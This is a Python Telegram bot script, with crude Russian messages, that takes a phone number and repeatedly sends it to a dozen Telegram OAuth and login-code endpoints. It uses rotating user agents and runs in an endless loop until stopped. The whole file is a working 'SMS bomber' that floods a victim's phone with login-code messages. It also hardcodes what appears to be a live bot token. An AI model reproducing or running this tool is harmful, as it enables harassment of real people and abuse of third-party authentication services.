import telebot
import requests
from fake_useragent import UserAgent
import time
import threading

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

active = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "кидай номер")

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.chat.id in active:
        active[message.chat.id]['stop'] = True
        bot.reply_to(message, "остановил")
    else:
        bot.reply_to(message, "нет активного")

@bot.message_handler(func=lambda m: True)
def spam(message):
    txt = message.text.strip()
    phone = ''.join(filter(str.isdigit, txt))
    if len(phone) < 10:
        bot.reply_to(message, "это не номер бля")
        return
    if message.chat.id in active:
        bot.reply_to(message, "уже хуярит")
        return
    bot.reply_to(message, f"спамлю на {phone}")
    def worker():
        ua = UserAgent()
        total = 0
        active[message.chat.id] = {'stop': False}
        try:
            while True:
                if active[message.chat.id]['stop']:
                    break
                headers = {'user-agent': ua.random}
                data = {'phone': phone}
                for endpoint in endpoints:
                    if active[message.chat.id]['stop']:
                        break
                    try:
                        r = requests.post(endpoint, headers=headers, data=data, timeout=10)
                        if r.status_code == 200:
                            total += 1
                    except:
                        pass
                time.sleep(5)
        finally:
            if message.chat.id in active:
                del active[message.chat.id]
        bot.send_message(message.chat.id, f"готово всего запросов {total}")
    threading.Thread(target=worker, daemon=True).start()

if __name__ == '__main__':
    bot.infinity_polling()
